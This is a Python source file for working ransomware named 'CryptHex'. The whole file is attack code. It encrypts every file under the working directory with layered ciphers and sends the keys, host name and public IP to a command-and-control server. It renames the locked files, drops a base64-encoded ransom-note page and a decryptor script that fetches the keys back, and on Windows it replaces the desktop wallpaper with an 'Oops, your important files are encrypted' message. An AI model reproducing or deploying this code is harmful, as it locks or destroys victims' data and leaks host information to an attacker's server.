from Encryptor import AES_Encryption, Bush_Encryption, Fernet 
import base64,random,requests,socket,platform,time,os,threading,sys

# MY PAGE
style_hex = base64.b64decode(b'QGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9SmV0QnJhaW5zK01vbm86d2dodEAxMDA7NTAwJmRpc3BsYXk9c3dhcCcpOwpAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1LYW5pdCcpOwoKKiB7CiAgbWFyZ2luOiAwOwogIHBhZGRpbmc6IDA7Cn0KCmJvZHkgewogIGZvbnQtc2l6ZTogMTBweDsKICBmb250LWZhbWlseTogSmV0QnJhaW5zIE1vbm8sIG1vbm9zcGFjZTsKICBjb2xvcjogcmdiKDI0NiwgMCwgMCk7CiAgYmFja2dyb3VuZC1jb2xvcjogI2Y4ZjlmYTsKfQoKLmFuaW1hdGUtYm90dG9tIHsKICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgLXdlYmtpdC1hbmltYXRpb24tbmFtZTogYW5pbWF0ZWJvdHRvbTsKICAtd2Via2l0LWFuaW1hdGlvbi1kdXJhdGlvbjogMXM7CiAgYW5pbWF0aW9uLW5hbWU6IGFuaW1hdGVib3R0b207CiAgYW5pbWF0aW9uLWR1cmF0aW9uOiAxcwp9CgpALXdlYmtpdC1rZXlmcmFtZXMgYW5pbWF0ZWJvdHRvbSB7CiAgZnJvbSB7CiAgICBib3R0b206IC0xMDBweDsKICAgIG9wYWNpdHk6IDAKICB9CgogIHRvIHsKICAgIGJvdHRvbTogMHB4OwogICAgb3BhY2l0eTogMQogIH0KfQoKQGtleWZyYW1lcyBhbmltYXRlYm90dG9tIHsKICBmcm9tIHsKICAgIGJvdHRvbTogLTEwMHB4OwogICAgb3BhY2l0eTogMAogIH0KCiAgdG8gewogICAgYm90dG9tOiAwOwogICAgb3BhY2l0eTogMQogIH0KfQoKLmFyZWF7CiAgYmFja2dyb3VuZDogLXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG8gbGVmdCwgIzhmOTRmYiwgIzRlNTRjOCk7ICAKICB3aWR0aDogMTAwJTsKICBoZWlnaHQ6MTAwdmg7CiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KC00NWRlZywgI2VlNzc1MiwgI2U3M2M3ZSwgIzIzYTZkNSwgIzIzZDVhYik7CgliYWNrZ3JvdW5kLXNpemU6IDQwMCUgNDAwJTsKCWFuaW1hdGlvbjogZ3JhZGllbnQgMTVzIGVhc2UgaW5maW5pdGU7Cn0KCkBrZXlmcmFtZXMgZ3JhZGllbnQgewoJMCUgewoJCWJhY2tncm91bmQtcG9zaXRpb246IDAlIDUwJTsKCX0KCTUwJSB7CgkJYmFja2dyb3VuZC1wb3NpdGlvbjogMTAwJSA1MCU7Cgl9CgkxMDAlIHsKCQliYWNrZ3JvdW5kLXBvc2l0aW9uOiAwJSA1MCU7Cgl9Cn0KCi5jaXJjbGVzewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICB0b3A6IDA7CiAgbGVmdDogMDsKICB3aWR0aDogMTAwJTsKICBoZWlnaHQ6IDEwMCU7CiAgb3ZlcmZsb3c6IGhpZGRlbjsKfQoKLmNpcmNsZXMgbGl7CiAgcG9zaXRpb246IGFic29sdXRlOwogIGRpc3BsYXk6IGJsb2NrOwogIGxpc3Qtc3R5bGU6IG5vbmU7CiAgd2lkdGg6IDIwcHg7CiAgaGVpZ2h0OiAyMHB4OwogIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4yKTsKICBhbmltYXRpb246IGFuaW1hdGUgMjVzIGxpbmVhciBpbmZpbml0ZTsKICBib3R0b206IC0xNTBweDsKICAKfQoKLmNpcmNsZXMgbGk6bnRoLWNoaWxkKDEpewogIGxlZnQ6IDI1JTsKICB3aWR0aDogODBweDsKICBoZWlnaHQ6IDgwcHg7CiAgYW5pbWF0aW9uLWRlbGF5OiAwczsKfQoKCi5jaXJjbGVzIGxpOm50aC1jaGlsZCgyKXsKICBsZWZ0OiAxMCU7CiAgd2lkdGg6IDIwcHg7CiAgaGVpZ2h0OiAyMHB4OwogIGFuaW1hdGlvbi1kZWxheTogMnM7CiAgYW5pbWF0aW9uLWR1cmF0aW9uOiAxMnM7Cn0KCi5jaXJjbGVzIGxpOm50aC1jaGlsZCgzKXsKICBsZWZ0OiA3MCU7CiAgd2lkdGg6IDIwcHg7CiAgaGVpZ2h0OiAyMHB4OwogIGFuaW1hdGlvbi1kZWxheTogNHM7Cn0KCi5jaXJjbGVzIGxpOm50aC1jaGlsZCg0KXsKICBsZWZ0OiA0MCU7CiAgd2lkdGg6IDYwcHg7CiAgaGVpZ2h0OiA2MHB4OwogIGFuaW1hdGlvbi1kZWxheTogMHM7CiAgYW5pbWF0aW9uLWR1cmF0aW9uOiAxOHM7Cn0KCi5jaXJjbGVzIGxpOm50aC1jaGlsZCg1KXsKICBsZWZ0OiA2NSU7CiAgd2lkdGg6IDIwcHg7CiAgaGVpZ2h0OiAyMHB4OwogIGFuaW1hdGlvbi1kZWxheTogMHM7Cn0KCi5jaXJjbGVzIGxpOm50aC1jaGlsZCg2KXsKICBsZWZ0OiA3NSU7CiAgd2lkdGg6IDExMHB4OwogIGhlaWdodDogMTEwcHg7CiAgYW5pbWF0aW9uLWRlbGF5OiAzczsKfQoKLmNpcmNsZXMgbGk6bnRoLWNoaWxkKDcpewogIGxlZnQ6IDM1JTsKICB3aWR0aDogMTUwcHg7CiAgaGVpZ2h0OiAxNTBweDsKICBhbmltYXRpb24tZGVsYXk6IDdzOwp9CgouY2lyY2xlcyBsaTpudGgtY2hpbGQoOCl7CiAgbGVmdDogNTAlOwogIHdpZHRoOiAyNXB4OwogIGhlaWdodDogMjVweDsKICBhbmltYXRpb24tZGVsYXk6IDE1czsKICBhbmltYXRpb24tZHVyYXRpb246IDQ1czsKfQoKLmNpcmNsZXMgbGk6bnRoLWNoaWxkKDkpewogIGxlZnQ6IDIwJTsKICB3aWR0aDogMTVweDsKICBoZWlnaHQ6IDE1cHg7CiAgYW5pbWF0aW9uLWRlbGF5OiAyczsKICBhbmltYXRpb24tZHVyYXRpb246IDM1czsKfQoKLmNpcmNsZXMgbGk6bnRoLWNoaWxkKDEwKXsKICBsZWZ0OiA4NSU7CiAgd2lkdGg6IDE1MHB4OwogIGhlaWdodDogMTUwcHg7CiAgYW5pbWF0aW9uLWRlbGF5OiAwczsKICBhbmltYXRpb24tZHVyYXRpb246IDExczsKfQoKCgpAa2V5ZnJhbWVzIGFuaW1hdGUgewoKICAwJXsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApIHJvdGF0ZSgwZGVnKTsKICAgICAgb3BhY2l0eTogMTsKICAgICAgYm9yZGVyLXJhZGl1czogMDsKICB9CgogIDEwMCV7CiAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMTAwMHB4KSByb3RhdGUoNzIwZGVnKTsKICAgICAgb3BhY2l0eTogMDsKICAgICAgYm9yZGVyLXJhZGl1czogNTAlOwogIH0KCn0KCi8qIEpBVkEgQ09MT1IgU1lOVEFYKi8KaDEgewogIGNvbG9yOiAjYjExYjFiOwp9Cgoua2V5d29yZCB7CiAgY29sb3I6IHJnYigyNTUsIDAsIDApOwp9CgoubWV0aG9kIHsKICBjb2xvcjogcmdiKDI1NSwgNjMsIDYzKTsKfQoKLmNsYXNzIHsKICBjb2xvcjogI2UwNmM3NTsKfQoKLnN0cmluZyB7CiAgY29sb3I6ICNmNDQxNDE7Cn0KCi5jb21tZW50IHsKICBjb2xvcjogI2U5ODY4NjsKfQoKLm1ldGFfY2hhciB7CiAgY29sb3I6ICNhYjAyMDI7Cn0KCi5pbnQgewogIGNvbG9yOiAjYTEwMDAwOwp9').decode()
crypt_hex = base64.b64decode(b'PGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5SYW5zb213YXJlIC0gTk9URSBDUllQVEhFWDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgI2xvYWRlciB7LypERUZBVUxUKi99CiAgICAgICAgI3BhZ2Ugey8qREVGQVVMVCovfQogICAgPC9zdHlsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0ic3R5bGUuY3NzIj4KICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3d3dy5zdmdyZXBvLmNvbS9zaG93LzUyOTA1My9sb2NrLnN2ZyI+CjwvaGVhZD4KPGJvZHkgb25sb2FkPSJteUZ1bmN0aW9uKCkiIHN0eWxlPSJiYWNrZ3JvdW5kOiAjMjgyYzM0OyI+CiA8ZGl2IGNsYXNzPSJhcmVhIiBpZD0ibG9hZGVyIj4KICAgIDxjZW50ZXI+PGgxIHN0eWxlPSJmb250LWZhbWlseTogS2FuaXQ7IGZvbnQtc2l6ZTogMzVweDsgY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsiPjxicj48YnI+PGJyPllPVSBXSUxMIEJFIE9QRU4gTk9URSBSQU5TT01XQVJFIFNPT04hPGJyPjxicj5bUkFOU09NV0FSRV0gZ2l0aHViLmNvbS9IZXgxNjI5PGJyPltTVkctSUNPTl0gd3d3LnN2Z3JlcG8uY29tL3N2Zy81MjkwNTMvbG9jazxicj5bTE9BREVSXSB3d3cudzNzY2hvb2xzLmNvbS9ob3d0by9ob3d0b19jc3NfbG9hZGVyLmFzcDxicj5bR1JBRElFTlQgQkFDS0dST1VORF0gY29kZXBlbi5pby9QMU4yTy9wZW4vcHlCTnpYPGJyPltBTklNQVRFRCBCQUNLR1JPVU5EXSBjb2RlcGVuLmlvL21vaGFpbWFuL3Blbi9NUXFNeW88L2gxPjwvY2VudGVyPgogICAgPHVsIGNsYXNzPSJjaXJjbGVzIj4KICAgICAgICA8bGk+PC9saT48bGk+PC9saT48bGk+PC9saT4KICAgICAgICA8bGk+PC9saT48bGk+PC9saT48bGk+PC9saT4KICAgICAgICA8bGk+PC9saT48bGk+PC9saT48bGk+PC9saT4KICAgICAgICA8bGk+PC9saT4KICAgICA8L3VsPgogPC9kaXY+CiA8ZGl2IHN0eWxlPSJkaXNwbGF5Om5vbmU7IHBhZGRpbmc6IDEwcHg7IiBpZD0icGFnZSIgY2xhc3M9ImFuaW1hdGUtYm90dG9tIj4KICAgIDxicj4KICAgIDxoMT48c3BhbiBjbGFzcz0ia2V5d29yZCI+cGFja2FnZTwvc3Bhbj4gPHNwYW4gY2xhc3M9Im1ldGhvZCI+IGNvbS5jcnlwdGhleDwvc3Bhbj48c3BhbiBjbGFzcz0ia2V5d29yZCI+Ozwvc3Bhbj48L2gxPgogICAgPGJyPjxicj4KICAgIDxoMT48c3BhbiBjbGFzcz0ia2V5d29yZCI+cHVibGljIGNsYXNzPC9zcGFuPiA8c3BhbiBjbGFzcz0ibWV0aG9kIj5NYWluIHs8L3NwYW4+PC9oMT4KICAgIDxicj4KICAgIDxoMT4mbmJzcDsmbmJzcDsmbmJzcDs8c3BhbiBjbGFzcz0ia2V5d29yZCI+cHVibGljIHN0YXRpYzwvc3Bhbj4gPHNwYW4gY2xhc3M9Im1ldGhvZCI+dm9pZCBtYWluPC9zcGFuPihTdHJpbmdbXSwgYXJncykgPHNwYW4gY2xhc3M9Im1ldGhvZCI+ezwvc3Bhbj48L2gxPgogICAgPGgxPiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxzcGFuIGNsYXNzPSJjb21tZW50Ij4vLyBOT1RFIFJBTlNPTVdBUkUhISEgSUQ9SURfR09UPC9zcGFuPjwvaDE+CiAgICA8aDE+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PHNwYW4gY2xhc3M9ImNvbW1lbnQiPi8vIERFQVIgTkFNRSBSRUFEIFRISVMgTk9URSBCRUZPUkU8L3NwYW4+PC9oMT4KICAgIDxoMT4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtTdHJpbmcgbm90ZV9tb3JlID0gPHNwYW4gY2xhc3M9InN0cmluZyI+IllvdXIgZG9jdW1lbnRzLCB2aWRlb3MsIGltYWdlcyBhbmQgb3RoZXIgZm9ybXMgb2YgZGF0YSBhcmUgbm93IGluYWNjZXNzaWJsZSwgYW5kIGNhbm5vdCBiZSB1bmxvY2tlZCB3aXRob3V0IHRoZSBkZWNyeXB0aW9uIGtleS48c3BhbiBjbGFzcz0ibWV0YV9jaGFyIj5cXG48L3NwYW4+VGhpcyBrZXkgaXMgY3VycmVudGx5IGJlaW5nIHN0b3JlZCBvbiBhIHJlbW90ZSBzZXJ2ZXIuPHNwYW4gY2xhc3M9Im1ldGFfY2hhciI+XFxuXFxuPC9zcGFuPlRvIGFjcXVpcmUgdGhpcyBrZXksIHJ1biBweXRob24gc2NyaXB0IG5hbWUgIkRlY3J5cHRvci5weSIuPHNwYW4gY2xhc3M9Im1ldGFfY2hhciI+XFxuPC9zcGFuPiBkb24ndCB3b3JyeSB3ZSBub3Qgc3RvbGVuIHlvdXIgZGF0YSBhbmQgYW55IHBheW1lbnQgZm9yIGRlY3J5cHQuPHNwYW4gY2xhc3M9Im1ldGFfY2hhciI+XFxuPC9zcGFuPkJlY2F1c2UgaXQgdGVzdCBwcm9qZWN0IG9uIGdpdGh1Yi5jb20vSGV4MTYyOSEhISI8L3NwYW4+PHNwYW4gY2xhc3M9ImtleXdvcmQiPjs8L3NwYW4+PC9oMT4KICAgIDxoMT4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8c3BhbiBjbGFzcz0ia2V5d29yZCI+Zm9yIDwvc3Bhbj48c3BhbiBjbGFzcz0iY2xhc3MiPig8c3BhbiBjbGFzcz0ic3RyaW5nIj5pbnQ8L3NwYW4+IGkgPSA8c3BhbiBjbGFzcz0iaW50Ij4wPC9zcGFuPjsgaSAmbHQ7IDxzcGFuIGNsYXNzPSJpbnQiPjM8L3NwYW4+PHNwYW4gY2xhc3M9InN0cmluZyI+Ozwvc3Bhbj4gaSsrKTwvc3Bhbj48c3BhbiBjbGFzcz0ibWV0aG9kIj4gezwvc3Bhbj48L2gxPgogICAgPGgxPiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxzcGFuIGNsYXNzPSJrZXl3b3JkIj5pZjwvc3Bhbj4gPHNwYW4gY2xhc3M9ImNsYXNzIj4oIGkgPT0gMiApIDwvc3Bhbj48c3BhbiBjbGFzcz0ibWV0aG9kIj57PC9zcGFuPjwvaDE+CiAgICA8aDE+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7U3lzdGVtPHNwYW4gY2xhc3M9ImNsYXNzIj4uPHNwYW4gY2xhc3M9Im1ldGhvZCI+b3V0PC9zcGFuPjxzcGFuIGNsYXNzPSJjbGFzcyI+Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibWV0aG9kIj5wcmludGxuPC9zcGFuPig8c3BhbiBjbGFzcz0ic3RyaW5nIj4iWU9VIEhBUyBCRUVOIEVOQ1JZUFRFRCBCWSBDUllQVEhFWCE8c3BhbiBjbGFzcz0ibWV0YV9jaGFyIj5cXG48L3NwYW4+Ijwvc3Bhbj4pOzwvaDE+CiAgICA8aDE+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7PHNwYW4gY2xhc3M9Im1ldGhvZCI+fTwvc3Bhbj48c3BhbiBjbGFzcz0ia2V5d29yZCI+IGVsc2UgaWYgPC9zcGFuPjxzcGFuIGNsYXNzPSJjbGFzcyI+KCBpID09IDEgKSA8L3NwYW4+IDxzcGFuIGNsYXNzPSJtZXRob2QiPns8L3NwYW4+CiAgICA8aDE+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7U3lzdGVtPHNwYW4gY2xhc3M9ImNsYXNzIj4uPHNwYW4gY2xhc3M9Im1ldGhvZCI+b3V0PC9zcGFuPjxzcGFuIGNsYXNzPSJjbGFzcyI+Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibWV0aG9kIj5wcmludGxuPC9zcGFuPig8c3BhbiBjbGFzcz0ic3RyaW5nIj5ub3RlX21vcmU8L3NwYW4+KTs8L2gxPgogICAgPGgxPiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxzcGFuIGNsYXNzPSJtZXRob2QiPn08L3NwYW4+PC9oMT4KICAgIDxoMT4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8c3BhbiBjbGFzcz0ibWV0aG9kIj59PC9oMT4KICAgIDxoMT4mbmJzcDsmbmJzcDsmbmJzcDs8c3BhbiBjbGFzcz0ibWV0aG9kIj59PC9zcGFuPjwvaDE+CiAgICA8aDE+PHNwYW4gY2xhc3M9Im1ldGhvZCI+fTwvc3Bhbj48L2gxPgogPC9kaXY+CiA8c2NyaXB0PgogICAgdmFyIHRpbWVfZ290OwogICAgZnVuY3Rpb24gbXlGdW5jdGlvbigpIHt0aW1lX2dpdCA9IHNldFRpbWVvdXQoc2hvd1BhZ2UsIDMwMDApO30KICAgIGZ1bmN0aW9uIHNob3dQYWdlKCkgewogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibG9hZGVyIikuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBhZ2UiKS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgIH0KIDwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4=')

# C2 SERVER
C2 = 'http://127.0.0.1:5000/'

decrypt = '''from Encryptor import AES_Encryption, Bush_Encryption, Fernet
import base64,os,socket,requests,threading

def decrypt(data,fernet_keys, keys, ivs, bush_keys):

 Fernet_Encryptor = Fernet(fernet_keys)
 Aes_Encryptor = AES_Encryption(key=keys, iv=ivs, mode=2)
 Bush_Encryptor = Bush_Encryption(key=bush_keys)

 chiper = base64.b16decode(data)
 chiper = Bush_Encryptor.decrypt(chiper)
 chiper = base64.b64decode(chiper)
 chiper = Aes_Encryptor.decrypt(chiper)
 chiper = Fernet_Encryptor.decrypt(chiper)

 return chiper

C2 = "'''+C2+'''"

def list_scanner(path,extension):
  target_files = []
  for root, subfiles, files in os.walk(path):
    for file in files:
     if extension in file:
      print(f"\x1b[38;5;76m [ \x1b[38;5;226mSCANNING \x1b[38;5;76m] \x1b[38;5;76mPATH\x1b[38;5;255m=\x1b[38;5;76m{root} \x1b[38;5;76mFILES\x1b[38;5;255m=\x1b[38;5;76m{file}\x1b[0m")
      target_files.append(os.path.join(root, file))
  return target_files

def got_decrypted(a,fernet_keys, keys, ivs, bush_keys,ex):
 with open(a,'rb') as f:
   got = decrypt(f.read(),fernet_keys, keys, ivs, bush_keys)

 with open(a,'wb') as f:
   f.write(got)
 print(f"\x1b[38;5;76m [ \x1b[38;5;226mDecrypt \x1b[38;5;76m] \x1b[38;5;76mFILES\x1b[38;5;255m=\x1b[38;5;76m{a} SIZE={len(got)}\x1b[0m")
 os.rename(a,a.replace(ex,''))

id = input("YOU PERSONAL ID ?")
got = requests.get(C2+'/Downloads',headers={'Id-Got':id,'X-Client-Ip':socket.gethostname()}).content.decode()
print(f"\x1b[38;5;76m [ \x1b[38;5;226mDOWNLOAD \x1b[38;5;76m] \x1b[38;5;76mURL\x1b[38;5;255m . . .\x1b[0m")
fernet_keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[0]
keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[1].split('|')[0].replace('Key=','')
ivs = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[1].split('|')[1].replace('Iv=','')
bush_keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[2]
extension = got.split(' ')[2].replace("EX=",'')
print(f"\x1b[38;5;76m [ \x1b[38;5;226mPROCESSS \x1b[38;5;76m] \x1b[38;5;76mEXTENSION\x1b[38;5;255m=\x1b[38;5;76m{extension}\x1b[0m")

for a in list_scanner(os.path.dirname(__file__),extension):
  threading.Thread(target=got_decrypted,args=(a,fernet_keys, keys, ivs, bush_keys,extension)).start()

with open('key.pem','w') as f:
 f.write(got)
  
requests.get(C2+'/',headers={'Mode':'DEL',"Id-Got":id,'X-Client-Ip':socket.gethostname()})'''

def encrypt(data,fernet_keys, keys, ivs, bush_keys):

 Fernet_Encryptor = Fernet(fernet_keys)
 Aes_Encryptor = AES_Encryption(key=keys, iv=ivs, mode=2)
 Bush_Encryptor = Bush_Encryption(key=bush_keys)

 try:
   chiper = Fernet_Encryptor.encrypt(data).decode()
 except:
   chiper = Fernet_Encryptor.encrypt(data.encode()).decode()
 chiper = Aes_Encryptor.encrypt(chiper)
 chiper = base64.b64encode(chiper).decode()
 chiper = Bush_Encryptor.encrypt(chiper)
 chiper = base64.b16encode(chiper)

 return chiper

def generate_string(number):
   key = ''
   letter = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
   for _ in range(int(number)):
      key += random.choice(letter)
   return key

# KEY
fernet_keys = Fernet.generate_key()
keys = generate_string(32)
ivs = generate_string(16)
bush_keys = generate_string(32)

# RANDOM EX FILE
ex_file = '.'+generate_string(4)+'_CryptHex'

# GET IP AND SENT KEY TO C2
ip = requests.get('https://api.ipify.org/?format=txt').content.decode()

id = requests.get(C2+'/ID_QUERY',headers={'X-Client-Ip':socket.gethostname()}).content.decode()
requests.get(C2+'/',headers={'Mode':'RECV','Id-Got':id,'X-Keys':f'{fernet_keys.decode()}#Key={keys}|Iv={ivs}#{bush_keys}','FILES':f'{ex_file}','X-Client-Ip':socket.gethostname(),'Ip':ip})

# SPEED SCANNER
def speed_up(path,target_files):target_files.append(path)
def list_scanner(path):
  target_files = []
  for root, subfiles, files in os.walk(path):
    for file in files:
     if file != os.path.basename(sys.argv[0]):
      threading.Thread(target=speed_up,args=(os.path.join(root, file),target_files)).start()
  return target_files

def threading_renames(a,ex_files):
  os.rename(a,a+ex_files)

def got_encrypted(a):
  global enc
  try:
   with open(a,'r') as f:
    got = encrypt(f.read(),fernet_keys, keys, ivs, bush_keys)
  except:
   with open(a,'rb') as f:
    got = encrypt(f.read(),fernet_keys, keys, ivs, bush_keys)
  with open(a,'wb') as f:
   f.write(got)

p = os.getcwd().replace('\\','/') # os.path.expanduser('~')) C:/Users/User not use os.getcwd()
got_list = list_scanner(p)
for a in got_list:
  threading.Thread(target=got_encrypted,args=(a,)).start()

with open(p + '/Info.html','w') as f:
  f.write(crypt_hex.replace('ID_GOT',id).replace('NAME',socket.gethostname()))

with open(p + '/style.css','w') as f:
  f.write(style_hex)

with open(p + '/Decryptor.py','w') as f:
  f.write(decrypt)

if platform.system().upper() == 'WINDOWS':
 from PIL import Image, ImageDraw, ImageFont
 import ctypes

 char_setting = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 char_file = ''
 for bit_files in range(15):
    char_file += random.choice(char_setting)

 IMG_wallpaper = char_file + '.png'
 Img = Image.new("RGB", (2050, 1050))
 Canvas= ImageDraw.Draw(Img)
 font = ImageFont.truetype("arial", int(55))
 Canvas.text((10,10),(f"""\n\n
                                Oops, your important files are encrypted.\n
                            If decryption of the files is necessary\n
                            Please follow the file "Info.hta"\n
                            Contact us "github.com/Hex1629"\n"""),fill=(255,0,0),font=font)                                                  
 Img.save(IMG_wallpaper)
 ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\{IMG_wallpaper}' , 0)
 time.sleep(0.3)
 os.remove(IMG_wallpaper)

for a in got_list:
  threading.Thread(target=threading_renames,args=(a,ex_file)).start()
